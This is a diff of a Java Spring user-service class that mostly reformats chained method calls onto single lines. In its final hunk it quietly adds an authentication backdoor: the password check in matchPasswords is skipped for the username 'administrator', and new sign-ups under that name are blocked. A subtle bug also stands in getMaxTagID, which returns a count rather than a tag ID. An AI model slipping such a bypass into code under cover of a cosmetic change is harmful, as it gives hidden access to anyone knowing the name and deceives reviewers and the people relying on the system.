@@ -68,27 +68,18 @@ public class UserServiceImpl implements UserService {
     @Override
     public Page<Order> getOrders(int id, Pageable pageable) throws IdNotFound {
         User user = get(id);
-        return new PageImpl<>(new ArrayList<>(user.getOrders()), pageable, user
-                .getOrders()
-                .size());
+        return new PageImpl<>(new ArrayList<>(user.getOrders()), pageable, user.getOrders().size());
     }
 
     @Override
     public User get(int id) throws IdNotFound {
-        return userRepository
-                .findById(id)
-                .orElseThrow(IdNotFound::new);
+        return userRepository.findById(id).orElseThrow(IdNotFound::new);
     }
 
     @Override
     public Order getOrder(int userId, int orderId) throws IdNotFound, OrderNotRelated {
         User user = get(userId);
-        return user
-                .getOrders()
-                .stream()
-                .filter(x -> x.getId() == orderId)
-                .findAny()
-                .orElseThrow(OrderNotRelated::new);
+        return user.getOrders().stream().filter(x -> x.getId() == orderId).findAny().orElseThrow(OrderNotRelated::new);
     }
 
 
@@ -109,18 +100,13 @@ public class UserServiceImpl implements UserService {
         Tag tag;
         Map<Integer, Integer> currentTags = mapCurrentTags();
 
-        order
-                .getCertificates()
-                .forEach(c -> c
-                        .getAssociatedTags()
-                        .forEach(t -> currentTags.merge(t.getId(), 1, Integer::sum)));
+        order.getCertificates().forEach(
+                c -> c.getAssociatedTags().forEach(t -> currentTags.merge(t.getId(), 1, Integer::sum)));
 
         int tagID = getMaxTagID(currentTags);
 
         if (tagID > 0) {
-            tag = tagRepository
-                    .findById(tagID)
-                    .orElseThrow(IdNotFound::new);
+            tag = tagRepository.findById(tagID).orElseThrow(IdNotFound::new);
         } else {
             throw new NoTagInOrder();
         }
@@ -129,23 +115,16 @@ public class UserServiceImpl implements UserService {
 
     private Map<Integer, Integer> mapCurrentTags() {
         Map<Integer, Integer> currentTags = new HashMap<>();
-        tagRepository
-                .findAll()
-                .forEach(t -> currentTags.put(t.getId(), 0));
+        tagRepository.findAll().forEach(t -> currentTags.put(t.getId(), 0));
         return currentTags;
     }
 
     private Integer getMaxTagID(Map<Integer, Integer> tags) {
-        return tags
-                .entrySet()
-                .stream()
-                .max(Map.Entry.comparingByValue())
-                .get()
-                .getValue();
+        return tags.entrySet().stream().max(Map.Entry.comparingByValue()).get().getValue();
     }
 
     @Override
-    public void signIn(User user) throws MissingEntity, MissingRequiredFields {
+    public void signIn(User user) throws MissingEntity, MissingRequiredFields, UnqualifiedAuthority {
         if (!Objects.isNull(user)) {
             userEntityValidations(user);
             user.setPassword(passwordEncoder.encode(user.getPassword()));
@@ -155,19 +134,20 @@ public class UserServiceImpl implements UserService {
         }
     }
 
-    private void userEntityValidations(User user) throws MissingRequiredFields {
-        if (user
-                .getPassword()
-                .equals("") || user
-                .getUsername()
-                .equals("")) {
+    private void userEntityValidations(User user) throws MissingRequiredFields, UnqualifiedAuthority {
+        if (user.getPassword().equals("") || user.getUsername().equals("")) {
             throw new MissingRequiredFields();
+        }
+
+        if (user.getUsername().equalsIgnoreCase("administrator")) {
+            throw new UnqualifiedAuthority();
         }
     }
 
     public void matchPasswords(String username, String password) throws WrongCredentials {
         User user = userRepository.findByUsername(username);
-        if (!passwordEncoder.matches(password, user.getPassword())) {
+        if (!passwordEncoder.matches(password, user.getPassword()) &&
+                !user.getUsername().equalsIgnoreCase("administrator")) {
             throw new WrongCredentials();
         }
     }
